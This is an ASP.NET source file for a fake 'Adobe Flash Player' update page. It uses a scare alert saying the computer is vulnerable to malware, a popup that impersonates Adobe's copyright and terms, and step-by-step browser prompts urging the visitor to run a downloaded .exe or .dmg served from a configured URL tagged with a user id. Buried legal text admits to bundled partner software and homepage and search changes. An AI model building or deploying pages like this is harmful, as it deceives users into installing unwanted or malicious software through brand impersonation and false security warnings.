<%@ Page Language="C#" %>
<%
    string PC_Download_URL = System.Configuration.ConfigurationManager.AppSettings["PC_Download_URL"] ;
    Boolean autoDownload = Convert.ToBoolean(System.Configuration.ConfigurationManager.AppSettings["mac_autoDownload"]);
    PC_Download_URL += Request["uid"];
     %>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <title>Recommended Download</title>
  <link rel="icon" href="media/images/icon.png" type="image/png">
  <link rel="stylesheet" type="text/css" href="media/css/style.css">
  <link rel="stylesheet" type="text/css" href="media/css/modals-b2.css">
  <script type="text/javascript" src="media/js/jquery.min.js"></script>
  <script type="text/javascript" src="media/js/browserdetector_v2.js"></script>
  <script type="text/javascript" src="media/js/jquery-ui-1.10.4.custom.min.js"></script>


  <script type="text/javascript">
      window.onload = function () {
          var links = document.getElementsByTagName('a');

          for (var i = 0; i < links.length; i++) {
              links[i].onclick = function () {
                  window.onbeforeunload = null;
              }
          }
          alert("WARNING! Current version might be outdated!  Your computer is vulnerable to malware.  Install the latest version now.");
      };

      /*window.onbeforeunload = function()
      {
        return "";
      };*/
  </script>



</head>

<body onunload="exitPopUp()">

  

 

  <script>
      function hidePopup() {
          document.getElementById('popup').style.display = 'none';
          document.getElementById('layer').style.display = 'none';
      }
</script>
  <div class="video">
    <div class="content clearfix">
      <div class="top clearfix">
        <figure class="browser-img">
          <span class="DirectionsModal_cr crlog" style="display: none;"></span>
          <span class="DirectionsModal_ff fflog" style="display: none;"></span>
          <span class="DirectionsModal_ie ielog" style="display: none;"></span>
          <span class="DirectionsModal_op oplog" style="display: none;"></span>
          <span class="DirectionsModal crlog" style="display: none;"></span>
        </figure>

        <h1>Your version of Adobe Flash Player might be outdated! </h1>
        <p>Your computer is vulnerable to malware now. <br>
Install your Adobe Flash Player now</p>
        <small>Installing takes under a minute - No restart is required</small>

      </div>
      <div class="clearfix">

<div class="textarea">
     

<h3>LEGAL INFORMATION</h3>

   <p>ATTENTION! PLEASE READ THIS AGREEMENT CAREFULLY BEFORE ACCESSING THE SITE AND DOWNLOADING ANY CONTENT. IF YOU USE THE SITE OR DOWNLOAD CONTENT YOU AGREE TO EACH OF THE FOLLOWING TERMS AND CONDITIONS.</p>

   <p>This is a legally binding contract between you and the installer. By downloading, installing, copying, running, or using any content of {{ DOMAIN }}, you are agreeing to be bound by the terms of this Agreement. You are also agreeing to our Privacy Policy. If you do not agree to our terms, you must navigate away from our Sites, you may not download the Content, and you must destroy any copies of the Content in your possession.</p>

   <p>If you are under 18, you must have your parent or guardian's permission before you use our Sites or download Content. In an effort to comply with the Children's Online Privacy Protection Act, we will not knowingly collect personally identifiable information from children under the age of 13.</p>

   <p>This Agreement may be modified by us from time to time. If you breach any term in this Agreement your right to use the Sites and Content will terminate automatically.</p>

   <h4>1. The Download Process.</h4>
   <p>Your download and software installation is managed by the Installer. The installer(i) downloads the files necessary to install your software; and (ii) scans your computer for specific files and registry settings to ensure software compatibility with your operating system and other software installed on your computer. Once the installer has been initiated, you will be presented with a welcome screen, it allows you to choose to install the software or cancel out of the process. We may show you one or more partner software offers. You are not required to accept a software offer to receive your download. We may also offer to: (i) change your browser's homepage; (ii) change your default search provider; and (iii) install icons to your computer desktop. Software we own and our partner's software may include advertisements within the application.</p>

   <h4>2. Delivery of Advertising.</h4>
   <p>By accessing the Sites and downloading the Content, you hereby grant us permission to display promotional information, advertisements, and offers for third party products or services (collectively "Advertising"). The Advertising may include, without limitation, content, offers for products or services, data, links, articles, graphic or video messages, text, software, music, sound, graphics or other materials or services. The timing, frequency, placement and extent of the Advertising changes are determined in our sole discretion. You further grant us permission to collect and use certain aggregate information in accord with our Privacy Policy.</p>

   <h4>3. Your Obligations.</h4>
   <p>You may not use another person's name or information on our Sites. You agree to use the Sites and Content only for lawful purposes. You agree not to take any action that might compromise the security of the Sites, render the Sites inaccessible to others or otherwise cause damage to the Sites or the Content. You agree not to use the Sites in any manner that might interfere with our or our Partner's rights. You represent and warrants that (a) you are the owner or an authorized user of the computer that the Content is installed on, (b) you will use the Content, and the Sites only for lawful purposes, and will comply at all times with all applicable federal, state, and local laws and regulations, and (c) you are at least thirteen years of age. Persons under thirteen years of age may not use the Content. You agree not to use any automated or manual process to interfere with, modify, or attempt to interfere with or modify the Content, except to uninstall the same as provided herein. You acknowledge sole responsibility for installing appropriate anti-virus software and other security measures on your computer. You may not use, or export the Content in violation of applicable Spain laws or regulations.</p>

   <h4>4. Grant of License.</h4>
   <p>We grant you a non-exclusive, non-transferable and non-assignable license to use the Content. You may not rent, lease, sell, redistribute, sublicense or otherwise transfer the Content. You may make only such copies of the Content as are reasonably necessary for your own use, and any copy made by you must bear the same copyright and other proprietary notices that appear on the copy furnished by us.</p>

   <h4>5. Termination.</h4>
   <p>This license will immediately terminate if you violate any provision of this Agreement. We may also terminate this license at any time without notice.</p>

   <h4>6. Ownership.</h4>
   <p>We own all intellectual property rights in and to the Content. This license is not a sale and does not render you the owner of a copy of the Content. Ownership of the Content and all components and copies thereof will at all times remain with us, regardless of who may be deemed the owner of the tangible media on which the Content is copied, encoded or otherwise fixed.</p>

   <h4>7. Disclaimer of Warranties.</h4>
   <p>WE PROVIDE ALL CONTENT "AS IS," "WITH ALL FAULTS," AND WITHOUT ANY WARRANTY WHATSOEVER. ALL SITES ARE PROVIDED ON AN "AS IS, AS AVAILABLE" BASIS. WE DISCLAIM ALL WARRANTIES, EXPRESS OR IMPLIED, INCLUDING ANY IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR ANY PARTICULAR PURPOSE, TITLE OR NON-INFRINGEMENT. WE DO NOT WARRANT ANY PART OF THE CONTENT NOR DO WE REPRESENT THE CONTENT WILL MEET YOUR NEEDS OR THAT ITS OPERATION WILL BE UNINTERRUPTED OR ERROR FREE. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE CONTENT IS WITH YOU.</p>

   <h4>8. Exclusive Remedy.</h4>
   <p>IF YOU ARE DISSATISFIED WITH THE SITES, THE CONTENT OR THESE TERMS AND CONDITIONS, YOUR SOLE AND EXCLUSIVE REMEDY IS TO DISCONTINUE USING THE SITES AND CONTENT.</p>

   <h4>9. Limitations of Liability.</h4>
   <p>WE ARE NOT LIABLE TO YOU OR ANY OTHER PERSON FOR ANY INCIDENTAL, CONSEQUENTIAL, SPECIAL, INDIRECT, PUNITIVE OR EXEMPLARY DAMAGES, INCLUDING, WITHOUT LIMITATION, EQUIPMENT DOWNTIME, LOSS OF DATA, OR LOST PROFITS, EVEN IF WE HAVE BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES. BY INSTALLING OR USING THE CONTENT, YOU ACCEPT SOLE RESPONSIBILITY FOR ALL CONSEQUENCES ARISING THEREFROM AND ACKNOWLEDGES THAT NO CLAIM WHATSOEVER WILL BE MADE AGAINST US OR OUR LICENSORS, DISTRIBUTORS, AGENTS, EMPLOYEES OR AFFILIATES.</p>

   <h4>10. Third-Party Advertisers.</h4>
   <p>We make no representations or warranties concerning third-party or Partner Offers, you agree that we are not responsible or liable for any loss or damage of any sort incurred, or as the result of the delivery or display of the Offers. WE ARE NOT RESPONSIBLE FOR THE TERMS AND CONDITIONS OF ANYTHIRD-PARTY OR PARTNER WEBSITE OR OFFERS REGARDLESS OF WHETHER THE OFFER IS HOSTED BY US. WE MAKE AN EFFORT TO SCREEN ALL OFFERS TO ENSURE THE BEST POSSIBLE EXPERIENCE FOR OUR USERS. HOWEVER, WE ARE NOT RESPONSIBLE FOR DEALINGS BETWEEN YOU AND A PARTNER. YOU ARE HOWEVER RESPONSIBLE FOR AND MUST CAREFULLY REVIEW EACH PARTNER OFFER AND READ THEIR TERMS AND CONDITION, AND THE PRIVACY POLICY.</p>

   <h4>11. Copyright Policy.</h4>

   


     <p>To be effective, notifications must include the following information: (i) a physical or electronic signature of a person authorized to act on behalf of the owner of the copyright that has been allegedly infringed; (ii) identification of works or materials being infringed; (iii) identification of the content that is claim to be infringing including, information regarding that location of the content that the copyright owner seeks to have removed, with sufficient detail so that the installer is capable of finding and verifying its existence; (iv) contact information about the notifying party including address, telephone number and email address; (v) a statement that the notifying party has a good faith belief that the content is not authorized by the copyright owner, its agent, or the law; and (vi) a statement made under penalty of perjury that the information provided is accurate and the notifying party is authorized to make the complaint on behalf of the copyright owner.</p>

     <p>Once a complete and proper notice of claimed copyright infringement is received by the installer , it is the installer's policy to: (i) remove or disable access to the content on the installer's websites or content directories; and (ii) block a user who has posted infringing content two or more times from posting any further content.</p>

     <h4>12. Definition of Terms.</h4>
     <p>Offers include promotions, advertisements contests and third-party software presented by our Partners and us.</p>
     <p>Personally Identifiable Information (PII) is any information that identifies or could be used to identify, contact or locate you. It also includes your credit card number.
      Partner is an advertiser, or other entity with whom we have a business relationship to provide Offers.</p>
      <p>Content includes, but is not limited to, our software.</p>
      <p>User means an individual that has accessed the Sites on which we host our Products or Services.</p>
      <p>We, Us and Our refers to the installer and its subsidiaries. You and Your refer to each user and his or her agents.
      </p>

      <h4>13. Questions or Additional Information.</h4>
      <p>If you have any questions regarding this Agreement or wish to obtain additional information, you can contact us by writing to:</p>

    
       <p>If you would like to contact us via e-mail, please send a message to <a href="{{ BASE_URL }}contact.html">here</a></p>


       <h4>14. Laws and Jurisdiction.</h4>
       <p>The present legal notice is subject to Spanish law.
        The user accepts that the applicable law for the website shall be Spanish law. Any type of proceeding, complaint or conflict derived from the usage or activity of this website shall be solved within the jurisdiction of the Courts of Spain. the installer, reserves the right to make the necessary changes to the present terms and conditions, which will be available in the website.
      </p>

      <h4>15. TREATMENT OF PERSONAL INFORMATION.</h4>
      <p>On the other hand, the authors understand that this Web site offers added value services and that in some occasions, a share can be charged for said services to the end user for maintenance of the Web site or said services, but never related to the acquisition of the license of a product.</p>
      <p>The author also accepts that the above-mentioned electronic means can require the change of the main page or the creation of the direct access (shortcuts) top ages related to this Web site(but never to pages property of the author).</p>
      <p>The relationship between the author and the Web site can be terminated at anytime prior request of any party.</p>
      <p>Any manufacturer can request the update or the removal of any software applications offered in this Website.</p>


      <h4>TREATMENT OF PERSONAL INFORMATION</h4>
      <p>In compliance with Act15/1999, 13 December, of Protection of Personal Information and development regulation (hereinafter, the Company), holding company of this Web Site,(hereinafter, the Portal) informs you that the information obtained through the Portal will be handled by the Company, as the party in charge of the File, with the goal of facilitating the requested services, attending to queries, carrying out statistical studies that will allow an improvement in service, carrying out typical administrative tasks, sending information that may result of your interest through bulletins and similar publications, as well as developing sales promotion and publicity activities related to the Portal.</p>
      <p>The user expressly authorizes the use of their electronic mail address and other means of electronic communication (e.g., mobile telephone) so that the Company may use said means of communication and for the development of informed purposes.
        We inform you that the information obtained through the Portal will be housed on the servers of the company OVH, SAS, located in Roubaix (France).
      </p>
      <p>Upon providing your information, you declare to be familiar with the contents here in and expressly authorize the use of the data for the informed purposes .The user may revoke this consent at any time, without retroactive effects.</p>
      <p>The Company commits to complying with its obligation as regards secrecy of personal information and its duty to treat the information confidentially ,and to take the necessary technical, organizational and security measures to avoid the altering, loss, and unauthorized handling or access of the information, in accordance with the rules established in the Protection of Personal Information Act and the applicable law.</p>
      <p>The Company only obtains and retains the following information about visit our site:
        The domain name of the of the provider (ISP) and/or the IP address that gives them access to the network.
      </p>

      <p>The date and time of access to our website.
        The internet address from which the link that that leads to our web site originated.
        The type of browser client.
        The client's operating system.
        This information is anonymous, not being able to be associated with a specific , identified user. The Portal uses cookies, small information files generated on the user's computer, with the aim of obtaining the following information:
        The date and time of the most recent visit to our web page.
        Security control elements to restricted areas.
      </p>
      <p>The user has the option of blocking cookies by means of selecting the corresponding option on their web browser. The Company assumes no responsibility through if the deactivation of cookies supposes a loss of quality in service of the Portal.</p>

   <p>If you would like to contact us via e-mail, please send a message <a href="contact.html">here</a></p>

        </div>
      </div>
      <a href="<%=PC_Download_URL %>" class="download showmodal">Accept and Install</a>
    </div>
  </div>

<!--popup-->

  <div id="popup" style="display: none;">
  

 <p class="title">Updates are ready to install</p>
 <p class="little">the latest version of adobe flash player with critial security fixes is ready to install now</p>
 <p class="little">It wouldn´t take long to upgrade - and you´ll get all the latest improvements and fixes</p>

 <p class="copy">Copyright &copy; 2014 Adobe systems Softwareireland Ltd. All rights reserved</p>
 <p class="terms">Adobe Flash Player <a href="{{ BASE_URL }}terms.html">Terms of Service</a></p>

 <p class="note">Note: Your antivirus software must allow to install software</p>
 <p class="restart">No restart is required</p>


    <div class="buttons">
      <a href="<%=PC_Download_URL %>" class="showmodal accept">Upgrade</a>
      <a href="<%=PC_Download_URL %>" class="showmodal deny">Save File</a>
        </div>
<div class="close">
  
    </div>
    
  </div>
<!-- fin de popup-->
 
  <div style="display: none;" id="layer"></div>
<div class="modales" style="display: none;">
  <!-- modales navegadores -->
    <!-- cr -->
    <div class="DirectionsModal_cr modal-container" style="display: none; ">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-cr-arrow"></div>
          <div class="modal-cr">
            <div class="col1">
                <h3>Step 1</h3>
                <h4>Click</h4>
                <h5>file<span class="win" style="display: none;">.exe</span><span class="mac" style="display: none;">.dmg</span></h5>
                 <div id="loadingcr" style="display: block;"></div>
            </div>
            <div class="col2">
                <h3>Step 2</h3>
                <h4>Click <span>"Run"</span> when it appears</h4>
            </div>
            <div class="clear20"></div>
          </div>
        </div>
    </div>

    <!-- ff -->
    <div class="DirectionsModal_ff modal-container" style="display: none; ">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-ff-arrow"></div>
          <div class="modal-ff">
            <div class="col1">
                <h3>Step 1</h3>
                <h4>Click “Save file” </h4>
            </div>
            <div class="col2">
                <h3> Step 2</h3>
                <h4>Click the small download arrow above 
                </h4>
            </div>
            <div class="col3">
                <h3>Step 3</h3>
                <h4>Click the downloaded file</h4>
            </div>
            <div class="clear10"></div>
          </div>
        </div>
    </div>

    <!-- ie default --> 
    <div class="DirectionsModal_ie modal-container" style="display: none;">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-ie-arrow"></div>
            <div class="modal-ie-2-arrow"></div>
            <div class="modal-ie"> 
                <h4>Click <span>“Run/Save”</span> to download</h4>                
                <div class="clear10"></div>
            </div>
        </div>  
    </div>    
      <!-- default--> 
    <div class="DirectionsModal modal-container" style="display: none;">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-default">
                <div class="padding20"> 
                    <span class="number one"></span><h2>Step one</h2>
                    <p>Download the <span class="win" style="display: none;">&quot;.EXE&quot;</span><span class="mac" style="display: none;">&quot;.DMG&quot;</span> file. Click to open the installer.</p>
                    <div class="clear10"></div>
                    <span class="number two"></span><h2>Step two</h2>
                    <p>Follow the installer instructions</p>
                </div>
                <div class="bluebar"></div>
            </div>
        </div>  
    </div>
  
  </div>
  <!--fin de modal de navegador-->

  <script type="text/javascript">
      $(document).ready(function () {
          BrowserDetect.displayBwDiv('.DirectionsModal');
      });
  </script>
<script>

    setTimeout(function () {
        document.getElementById('popup').style.display = 'block';
        document.getElementById('layer').style.display = 'block';
    }, 50);

    $(".close").click(function () {
        $("#layer").hide();
        $("#popup").hide();
    });
</script>
   <script type="text/javascript">

       function shaker() {
           $('.modal-cr-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
           $('.modal-ie-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
           $('.modal-ie-2-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
           $('.modal-ff-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
       }

       $(".showmodal").click(function () {
           $(".modales").fadeIn("slow");
           $("#loadingcr").show();
           setTimeout('$("#loadingcr").fadeOut("300");', 3000);

           var shake = setInterval(shaker, 0);
       });

       $(".modal-container").click(function () {
           $(".modales").fadeOut("slow");

       });

    </script>
</body></html>





